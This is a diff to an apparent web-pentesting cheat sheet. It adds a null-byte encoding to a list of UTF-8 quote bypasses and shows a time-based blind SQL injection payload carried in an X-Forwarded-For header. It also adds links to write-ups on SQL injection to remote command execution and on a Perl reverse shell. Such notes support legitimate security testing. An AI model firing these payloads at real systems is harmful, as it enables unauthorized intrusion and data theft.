@@ -22,7 +22,9 @@ Bypass using UTF-8
 " = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
 " = %CA%BA
 ' = %CA%B9
+Null = %00
 ```
+
 
 XSS Ideas
 ```
@@ -76,6 +78,15 @@ SQL Injection Ideas:
 ---
 Blind SQL Injection & Bypass
 Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+
+----
+SQL injection to RCE:
+https://systemweakness.com/sql-injection-to-remote-command-execution-rce-dd9a75292d1d
+```
+
+RCE:
+```
+https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10
 ```
 
 Some SQLMap Commands to start:
